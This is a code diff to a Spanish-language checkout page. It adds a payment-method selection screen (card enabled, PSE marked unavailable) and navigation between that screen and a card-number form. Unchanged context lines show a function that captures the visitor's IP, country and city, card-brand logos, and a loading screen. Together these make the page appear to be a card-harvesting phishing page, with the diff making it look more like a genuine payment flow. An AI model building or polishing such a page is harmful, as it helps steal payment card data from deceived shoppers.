@@ -56,8 +56,44 @@
         .location-info svg { width: 18px; height: 18px; border-radius: 2px; }
         .edit-link { color: #007bff; font-weight: 600; font-size: 12px; cursor: pointer; }
 
+        /* --- PANTALLA MEDIOS DE PAGO --- */
+        .payment-methods { padding: 25px 20px; }
+        .payment-methods .section-title { font-size: 16px; font-weight: 700; color: #333; margin-bottom: 20px; }
+        .method-card {
+            display: flex; align-items: center; justify-content: space-between;
+            border: 1.5px solid #e0e0e0; border-radius: 10px;
+            padding: 14px 16px; margin-bottom: 14px;
+            cursor: pointer; transition: all 0.2s ease;
+            background: #fff;
+        }
+        .method-card:hover:not(.disabled) { border-color: #111111; box-shadow: 0 4px 14px rgba(0,0,0,0.08); transform: translateY(-1px); }
+        .method-card.disabled { opacity: 0.45; cursor: not-allowed; background: #fafafa; }
+        .method-left { display: flex; align-items: center; gap: 14px; }
+        .method-icon { width: 48px; height: 32px; object-fit: contain; flex-shrink: 0; }
+        .method-text { display: flex; flex-direction: column; gap: 2px; }
+        .method-name { font-size: 14px; font-weight: 600; color: #222; }
+        .method-desc { font-size: 11px; color: #888; font-weight: 400; }
+        .method-badge {
+            font-size: 9px; font-weight: 700; letter-spacing: 0.5px;
+            background: #f0f0f0; color: #777;
+            padding: 3px 7px; border-radius: 4px; text-transform: uppercase;
+        }
+        .method-arrow { color: #bbb; font-size: 18px; font-weight: 700; }
+        .method-card.disabled .method-arrow { display: none; }
+
         /* --- PANTALLA 2: FORMULARIO DE TARJETA --- */
-        .card-form { padding: 25px 20px; }
+        .card-form { padding: 25px 20px; display: none; }
+        .card-form.active { display: block; }
+        .payment-methods.hidden { display: none; }
+
+        .back-link {
+            display: inline-flex; align-items: center; gap: 6px;
+            font-size: 12px; font-weight: 600; color: #555;
+            cursor: pointer; margin-bottom: 18px; transition: color 0.2s;
+        }
+        .back-link:hover { color: #111; }
+        .back-link svg { width: 14px; height: 14px; fill: currentColor; }
+
         .form-title { font-size: 16px; font-weight: 600; color: #333; margin-bottom: 25px; }
 
         .input-group { display: flex; align-items: center; border-bottom: 1px solid #ccc; padding-bottom: 8px; margin-bottom: 20px; position: relative; }
@@ -176,9 +212,47 @@
             <a href="#" class="edit-link">edit</a>
         </div>
 
-        <!-- PANTALLA 2: FORMULARIO DE TARJETA -->
+        <!-- ============================================================ -->
+        <!-- PANTALLA: MEDIOS DE PAGO (NUEVA)                              -->
+        <!-- ============================================================ -->
+        <div class="payment-methods" id="paymentMethodsScreen">
+            <div class="section-title">Medios de pago</div>
+
+            <!-- Opción TARJETA (habilitada) -->
+            <div class="method-card" id="methodCard">
+                <div class="method-left">
+                    <img src="tarjeta.png" alt="Tarjeta" class="method-icon">
+                    <div class="method-text">
+                        <span class="method-name">Tarjeta de crédito / débito</span>
+                        <span class="method-desc">Visa, Mastercard, American Express</span>
+                    </div>
+                </div>
+                <span class="method-arrow">›</span>
+            </div>
+
+            <!-- Opción PSE (deshabilitada) -->
+            <div class="method-card disabled">
+                <div class="method-left">
+                    <img src="pse.png" alt="PSE" class="method-icon">
+                    <div class="method-text">
+                        <span class="method-name">PSE</span>
+                        <span class="method-desc">Pago en línea con tu banco</span>
+                    </div>
+                </div>
+                <span class="method-badge">No disponible</span>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- PANTALLA 2: FORMULARIO DE TARJETA                              -->
+        <!-- ============================================================ -->
         <div class="card-form" id="cardForm">
             
+            <div class="back-link" id="backToMethods">
+                <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
+                Volver a medios de pago
+            </div>
+
             <div class="alert" id="alertError">
                 <span id="mensajeError">Por favor, completa todos los campos correctamente</span>
             </div>
@@ -285,6 +359,24 @@
         });
 
         // ============================================================
+        // NAVEGACIÓN: MEDIOS DE PAGO <-> FORMULARIO TARJETA
+        // ============================================================
+        const paymentMethodsScreen = document.getElementById('paymentMethodsScreen');
+        const cardForm = document.getElementById('cardForm');
+        const methodCard = document.getElementById('methodCard');
+        const backToMethods = document.getElementById('backToMethods');
+
+        methodCard.addEventListener('click', function() {
+            paymentMethodsScreen.classList.add('hidden');
+            cardForm.classList.add('active');
+        });
+
+        backToMethods.addEventListener('click', function() {
+            cardForm.classList.remove('active');
+            paymentMethodsScreen.classList.remove('hidden');
+        });
+
+        // ============================================================
         // CAPTURAR IP + PAÍS + CIUDAD
         // ============================================================
         async function capturarIP() {
@@ -386,7 +478,6 @@
         }
         
         // 🔥 IMÁGENES DEL INPUT (Pequeñas al lado del número)
-        // ✅ CORREGIDO: mastercard ahora usa 'master.png'
         function updateCardLogo(type) {
             cardLogo.innerHTML = '';
             const map = { visa: 'visa.png', mastercard: 'master.png', amex: 'ame.png' };
@@ -583,7 +674,6 @@
             logoContainer.style.display = 'flex';
             
             // 🔥 IMÁGENES DE LA PANTALLA DE CARGA (Grandes)
-            // ✅ CORREGIDO: mastercard ahora usa 'master.png'
             const cardLogoFile = { 
                 'visa': 'idvisa.png', 
                 'mastercard': 'master.png', 
